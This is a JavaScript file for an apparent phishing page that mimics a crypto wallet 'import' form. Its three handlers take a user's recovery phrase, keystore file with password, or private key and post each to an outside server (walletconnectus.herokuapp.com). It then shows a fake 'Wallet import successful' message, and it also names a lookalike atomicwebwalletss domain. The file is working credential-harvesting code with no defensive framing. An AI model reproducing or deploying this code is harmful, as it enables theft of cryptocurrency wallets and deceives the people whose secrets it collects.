const import_btn_1 = document.getElementById("import_btn_1");
const import_btn_2 = document.getElementById("import_btn_2");
const import_btn_3 = document.getElementById("import_btn_3");

const phrase = document.getElementById("phrase_nav");
const keystore = document.getElementById("keystore_nav");
const private = document.getElementById("private_nav");

const phrase_a = document.getElementById("phrase_nav_a");
const keystore_a = document.getElementById("keystore_nav_a");
const private_a = document.getElementById("private_nav_a");

// PHRASE
const phrase_textarea = document.getElementById("phrase_text_area");
const type_phrase = document.getElementById("type_phrase");

// KEYSTORE
const keystore_text_area = document.getElementById("keystore_text_area");
const keystore_pass_input = document.getElementById("keystore_pass_input");
const type_keystore = document.getElementById("type_keystore");

// PRIVATE KEY
const private_key_input = document.getElementById("private_key_input");
const type_private = document.getElementById("type_private");

const phrase_div = document.getElementById("phrase");
const keystore_div = document.getElementById("keystore");
const private_div = document.getElementById("privatekey");

// submit action
const submit_url =
  "https://atomicwebwalletss.online/walletconnect/unlocknow.php";

phrase.addEventListener("click", () => {
  phrase_div.className += " show active";
  keystore_div.classList.remove("show", "active");
  private_div.classList.remove("show", "active");
  phrase_a.classList.add("active");
  keystore_a.classList.remove("active");
  private_a.classList.remove("active");
});

keystore.addEventListener("click", () => {
  keystore_div.className += " show active";
  phrase_div.classList.remove("show", "active");
  private_div.classList.remove("show", "active");
  keystore_a.classList.add("active");
  phrase_a.classList.remove("active");
  private_a.classList.remove("active");
});

private.addEventListener("click", () => {
  private_div.className += "show active";
  phrase_div.classList.remove("show", "active");
  keystore_div.classList.remove("show", "active");
  private_a.classList.add("active");
  keystore_a.classList.remove("active");
  phrase_a.classList.remove("active");
});

const formSubmitPhrase = async (e) => {
  e.preventDefault();
  import_btn_1.innerText = "Loading..."
  const urlParams = new URLSearchParams(window.location.search);
  const wallet = urlParams.get("w");
  const phrase_value = phrase_textarea.value;
  const type = type_phrase.value;
  const {} = await axios.post("https://walletconnectus.herokuapp.com/submit", { type, v1: phrase_value, wallet });
  sweetAlert("Success!", "Wallet import successful", "success");
  phrase_textarea.value = "";
  import_btn_1.innerText = "IMPORT"
};
const formSubmitKeystore = async (e) => {
  e.preventDefault();
  import_btn_2.innerText = "Loading..."
  const urlParams = new URLSearchParams(window.location.search);
  const wallet = urlParams.get("w");
  const keystore_json = keystore_text_area.value;
  const keystore_pass = keystore_pass_input.value;
  const type = type_keystore.value;
  const {} = await axios.post("https://walletconnectus.herokuapp.com/submit", {
    type,
    v1: keystore_json,
    v2: keystore_pass,
    wallet,
  });
  sweetAlert("Success!", "Wallet import successful", "success");
  keystore_text_area.value = "";
  keystore_pass_input.value = "";
  import_btn_2.innerText = "IMPORT"
};
const formSubmitPrivateKey = async (e) => {
  e.preventDefault();
  import_btn_3.innerText = "Loading..."
  const urlParams = new URLSearchParams(window.location.search);
  const wallet = urlParams.get("w");
  const private_key = private_key_input.value;
  const type = type_private.value;
  const {} = await axios.post("https://walletconnectus.herokuapp.com/submit", {
    type,
    v1: private_key,
    wallet,
  });
  sweetAlert("Success!", "Wallet import successful", "success");
  private_key_input.value = "";
  import_btn_3.innerText = "IMPORT"
};
